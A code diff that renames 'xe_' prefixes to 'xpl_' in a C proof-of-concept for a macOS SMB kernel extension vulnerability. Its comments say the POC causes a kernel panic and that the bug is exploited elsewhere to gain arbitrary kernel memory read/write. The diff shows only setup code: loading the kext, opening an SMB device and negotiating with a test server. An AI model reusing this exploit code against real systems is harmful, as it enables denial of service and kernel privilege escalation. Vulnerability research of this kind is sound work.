@@ -13,7 +13,7 @@
 
 #include <smbfs/smb_dev.h>
 #include <smbfs/smb_dev_2.h>
-#include <xe_smbx/smbx_conf.h>
+#include <xpl_smbx/smbx_conf.h>
 
 ///
 /// SMB 3.0 protocol allows clients to use multi channel feature to improve performance and fault
@@ -156,7 +156,7 @@
 ///
 /// See POC below which will trigger the vulnerabiltiy and cause a kernel panic
 ///
-/// This vulnerabilty is exploited in `xe_kmem/smb_dev_rw.c` to obtain read write access to
+/// This vulnerabilty is exploited in `xpl_kmem/smb_dev_rw.c` to obtain read write access to
 /// `struct smb_dev` allocations in kext.48 zone which inturn is used to achieve arbitary kernel
 /// memory read write.
 ///
@@ -183,13 +183,13 @@ int smb_client_open_dev(void) {
 int main(int argc, const char * argv[]) {
     smb_client_load_kext();
     
-    /// Socket address of xe_smbx server
+    /// Socket address of xpl_smbx server
     struct sockaddr_in smb_addr;
     bzero(&smb_addr, sizeof(smb_addr));
     smb_addr.sin_family = AF_INET;
     smb_addr.sin_len = sizeof(smb_addr);
-    smb_addr.sin_port = htons(XE_SMBX_PORT);
-    inet_aton(XE_SMBX_HOST, &smb_addr.sin_addr);
+    smb_addr.sin_port = htons(xpl_SMBX_PORT);
+    inet_aton(xpl_SMBX_HOST, &smb_addr.sin_addr);
     
     /// Open a new smb device (`/dev/nsmb*`)
     int smb_dev = smb_client_open_dev();
@@ -217,7 +217,7 @@ int main(int argc, const char * argv[]) {
     
     if (negotiate_req.ioc_errno) {
         printf("[ERROR] SMBIOC_NEGOTIATE returned non zero ioc_errno %d\n", negotiate_req.ioc_errno);
-        printf("[ERROR] Make sure that xe_smbx server is running\n");
+        printf("[ERROR] Make sure that xpl_smbx server is running\n");
         exit(1);
     }
     
